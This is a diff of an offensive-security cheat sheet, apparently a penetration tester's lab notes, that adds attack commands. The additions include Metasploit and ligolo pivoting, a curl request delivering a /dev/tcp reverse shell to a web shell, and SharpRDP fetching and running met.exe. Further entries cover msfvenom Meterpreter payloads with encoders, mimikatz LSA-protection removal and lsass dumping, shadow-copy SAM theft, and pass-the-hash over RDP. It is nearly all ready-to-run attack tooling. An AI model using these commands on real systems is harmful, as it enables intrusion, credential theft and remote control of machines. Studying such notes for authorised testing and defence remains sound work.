@@ -49,15 +49,27 @@ ssh -N -R 127.0.0.1:$LPORT:$RHOST:$RPORT kali@kali-ip
 ssh -N -R $LPORT kali@kali-ip
 ===SSHUTTLE
 sshuttle -r database_admin@192.168.238.63:2222 10.4.238.0/24 172.16.238.0/24
+
 ===LIGOLO
-#Starting proxy
+#Listener
 sudo ip tuntap add user kali mode tun ligolo;sudo ip link set ligolo up;proxy -selfcert -laddr 0.0.0.0:443
-#Starting Agent
+#Agent
 .\agent.exe -connect $LHOST:443 -ignore-cert
-#Adding route to internal network
+#Listener
 sudo ip route add 172.16.201.0/24 dev ligolo
-#For local port forwarding
-sudo ip route add 240.0.0.1/24 dev ligolo
+
+===Metasploit
+# 1. Configure reverse tunnel 
+msf5 exploit(multi/handler) > use multi/manage/autoroute
+msf5 exploit(multi/handler) > set session 1 # already established shell session 
+msf5 exploit(multi/handler) > exploit
+msf5 post(multi/manage/autoroute) > use auxiliary/server/socks4a
+msf5 auxiliary(server/socks4a) > set srvhost 127.0.0.1
+msf5 auxiliary(server/socks4a) > exploit -j
+
+# 2. force TCP through TOR or SOCKS Proxy
+sudo bash -c 'echo "socks4 127.0.0.1 1080" >> /etc/proxychains.conf' 
+proxychains rdesktop $RHOST
 
 ================================================================================
 ===Nmap====
@@ -83,19 +95,10 @@ sed 's///g' file
 curl -X POST -F file=@/path/to/file http://target.com
 #Post request with form values
 curl -X POST -H "Content-type:multipart/form-data" -F password="57416a3f482d92ce54d4570802ea807a" -F cmd='/bin/sh -i >& /dev/tcp/192.168.45.165/5000 0>&1' http://target.pg/wp-content/uploads/simple-file-list/7734.php
-#POST with json data
-curl -X POST -d '{"search":"london"}' -H 'Content-Type: application/json' http://<SERVER_IP>:<PORT>/search.php
 #Upload files
 curl --data @/path/to/file
 #HTTPS
 curl -k https://
-#Basic Auth
-curl -u admin:admin http://<SERVER_IP>:<PORT>/
-curl http://admin:admin@<SERVER_IP>:<PORT>/
-#Set cookies
-curl -b 'PHPSESSID=c1nsa6op7vtk7kdis7bcnbadf1' http://<SERVER_IP>:<PORT>/
-
-
 
 ===wget
 #Download 
@@ -144,6 +147,19 @@ recurse ON
 prompt OFF
 ===enum4linux
 enum4linux [-u user] [-p password] -a target.pg
+
+===RDP===
+===xfreerdp
+xfreerdp /u:offsec /p:lab /v:$target /cert-ignore /dynamic-resolution
+xfreerdp3 /u:offsec /p:lab /v:$target /cert:ignore /dynamic-resolution
+#PTH
+xfreerdp /u:admin /pth:2892D26CDF84D7A70E2EB3B9F05C425E /v:$target /cert-ignore
+===sharprdp #console rdp
+SharpRDP.exe computername=appsrv01 command=notepad username=corp1\dave password=lab
+
+sharprdp.exe computername=appsrv01 command="powershell (New-Object System.Net.WebClient).DownloadFile('http://192.168.119.120/met.exe', 'C:\Windows\Tasks\met.exe'); C:\Windows\Tasks\met.exe" username=corp1\dave password=lab
+ 
+
 
 ===RPC===
 ===rpcclient
@@ -413,13 +429,32 @@ GIF89a1
 ===msfvenom===
 ===Basic usage
 msfvenom -p <payload/type> LHOST=$LHOST LPORT=$LPORT -f <format> -o <outfile>
+===Listing
+msfvenom --list encrypt / encode
 ===Shellcode
 msfvenom -p windows/meterpreter/reverse_tcp LHOST=$LHOST LPORT=$LPORT -f python -b "<\xBad\xBytes\xTo\xIgnore>" -v shellcode
+#Meterpreter
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=$LHOST LPORT=81 -f csharp -v shellcode
+
 ===Examples
-msfvenom -p windows/x64/shell_reverse_tcp LHOST=$LHOST LPORT=80 -f exe -o reverse.exe
-msfvenom -p windows/shell_reverse_tcp LHOST=$LHOST LPORT=1234 -f exe -o reverse.exe
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=$LHOST LPORT=81 -f exe -o reverse.exe
+#Encoding
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=$LHOST LPORT=81 -e x64/zutto_dekiru -f exe -o reverse.exe
+-e x86/shikata_ga_nai
+#Templates
+-x /home/kali/notepad.exe
+#Encryption
+--encrypt aes256 --encrypt-key <randomkey>
+
+msfvenom -p windows/shell_reverse_tcp LHOST=$LHOST LPORT=81 -f exe -o reverse.exe
+
 #AlwaysInstallElevated msi
 msfvenom -p windows/x64/shell_reverse_tcp LHOST=$LHOST LPORT=80 -a x64 --platform Windows -f msi -o evil.msi
+
+==================================================================================
+===Listeners===
+#Meterpreter staged
+msfconsole -q -x "use exploit/multi/handler; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST $LHOST; set LPORT 81; set AutoRunScript migrate -n explorer.exe; exploit"
 
 ====================================AD========================================
 
@@ -811,7 +846,7 @@ Get-DomainComputer -Domain *domain* | Resolve-IPAddress
 
 ===windows download===
 ===single file
-certutil.exe -urlcache -f http://$LHOST:8000/
+certutil.exe -urlcache -f http://$LHOST:8000/ outfile.exe
 powershell iwr -uri $LHOST:8000/ -OutFile out
 ===loop for multi files
 $baseUrl = "http://$LHOST/"
@@ -843,6 +878,11 @@ Invoke-AllChecks
 iex(new-object net.webclient).downloadstring("http://$LHOST:8000/Invoke-Sharphound.ps1"); Invoke-Sharphound - CollectionMethod All,GPOLocalGroup -Domain *domain*; Invoke-Sharphound -CollectionMethod All -Domain *domain*
 
 ===Dumping Hashes===
+===SHADOW COPY
+wmic shadowcopy call create Volume='C:\'
+vssadmin list shadows
+cmd /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\windows\system32\config\sam \\destination\
+
 ===MIMIKATZ
 token::elevate
 privilege::debug
@@ -853,6 +893,25 @@ lsadump::secrets
 lsadump::cache
 #specify SAM & SYSTEM
 lsadump::sam /system:C:\Windows\Repair\SYSTEM /sam:C:\Windows\Repair\SAM
+
+#msfconsole kiwi
+msfconsole> getsystem
+msfconsole> load kiwi
+msfconsole> lsa_dump_sam
+msfconsole> lsa_dump_secrets
+
+#Bypass LSA Protections
+mimikatz # privilege::debug
+mimikatz # !+
+mimikatz # !processprotect /process:lsass.exe /remove
+mimikatz # sekurlsa::logonpasswords
+
+#Memory Dumping
+1. task manager > details tab >  lsass.exe > create dump file OR procdump.exe -ma lsass.exe
+2. copy to local machine
+3. open mimikatz on local
+4. mimikatz # sekurlsa::minidump lsass.dmp
+5. mimikatz # sekurlsa::logonpasswords
 
 ===impacket-secretsdump
 #remote dumping with creds (can be used for dc-sync attack)
@@ -897,6 +956,31 @@ Invoke-RunasCs -Username svc_mssql -Password trustno1 -Command "Powershell IEX(N
 
 ===PsExec (uses smb)
 impacket-psexec username@target.pg [-hashes hash]
+
+
+===LAPS
+Import-Module .\LAPSToolkit.ps1
+Find-LAPSDelegatedGroups
+
+#Enum members that can read LAPS passwords
+Get-NetGroupMember -GroupName "LAPS Password Readers"
+
+#Enumerate computers with laps, shows password if ran with user in "LAPS Password Readers"
+Get-LAPSComputers
+
+
+===RDP
+#RestrictedAdmin PTH
+
+xfreerdp /u:admin /pth:2892D26CDF84D7A70E2EB3B9F05C425E /v:192.168.120.6 /cert-ignore
+
+mimikatz # sekurlsa::pth /user:admin /domain:corp1 /ntlm:2892D26CDF84D7A70E2EB3B9F05C425E /run:"mstsc.exe /restrictedadmin"
+
+#Enable Restricted Admin Mode
+1. Open admin shell with hash: sekurlsa::pth /user:admin /domain:corp1 /ntlm:2892D26CDF84D7A70E2EB3B9F05C425E /run:powershell
+2. Shell to target PS C:\Windows\system32> Enter-PSSession -Computer appsrv01
+3. Enable ResAdmin: [appsrv01]: PS C:\Users\admin\Documents> New-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Lsa" -Name DisableRestrictedAdmin -Value 0
+
 
 ==================================================================================
 ===Windows new user
